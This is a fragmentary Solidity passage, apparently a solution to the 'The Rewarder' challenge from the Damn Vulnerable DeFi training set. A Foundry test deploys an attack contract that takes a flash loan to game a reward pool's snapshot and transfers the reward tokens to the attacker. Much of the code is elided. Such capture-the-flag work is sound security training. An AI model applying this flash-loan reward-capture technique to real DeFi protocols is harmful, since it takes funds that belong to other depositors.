...
contract TheRewarder is Test {
    ...
    function testExploit() public {
        ...
        RewarderAtk atk = new RewarderAtk(address(theRewarderPool), address(dvt), address(flashLoanerPool));
        vm.warp(11 days);
        atk.exploit(1_000_000 ether);
        // vm.warp(16 days);
        // console.log("%s", theRewarderPool.isNewRewardsRound());
        // theRewarderPool.distributeRewards();
...
contract RewarderAtk {
    TheRewarderPool public rewarder;
    DamnValuableToken public dvt;
    AccountingToken public acc;
    FlashLoanerPool loaner;
    address public attacker;
    bool deposited = false;

    constructor(address rewarderPool, address _dvt, address _loaner) {
        rewarder = TheRewarderPool(rewarderPool);
        dvt = DamnValuableToken(_dvt);
        acc = AccountingToken(rewarder.accToken());
    ...
    function recordSnapshot() public {
    ...
    function receiveFlashLoan(uint256 amount) public payable {
      ...
      rewarder.rewardToken().transfer(attacker, rewarder.rewardToken().balanceOf(address(this)));
    }
}
